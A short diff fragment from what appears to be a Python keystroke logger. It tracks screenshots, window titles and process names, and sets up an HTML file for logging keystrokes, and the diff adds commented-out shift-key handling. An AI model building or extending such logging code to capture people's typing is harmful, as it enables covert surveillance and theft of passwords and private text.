@@ -18,6 +18,8 @@ last_screenshot_time = datetime.datetime.now()
 current_window_title = None
 current_process_name = None
 
+# Another shit for the shift.
+# shift_pressed = False
 # Create the HTML log file but for some reason I can't figure out how to add another div for the key-pressed without adding a new line
 log_file = open(os.path.join(current_dir, "keystrokes.html"), "w", encoding="utf-8")
 log_file.write('<html>\n<head>\n<meta charset="utf-8">\n<title>Keystrokes Log</title>\n<style>\n.highlight{background-color:#dedede;color:#000000;padding:0.2em;margin-top:0.2cm;margin-bottom:0.2cm;font-family:Arial, Helvetica, sans-serif;}\n</style>\n</head>\n<body>\n')
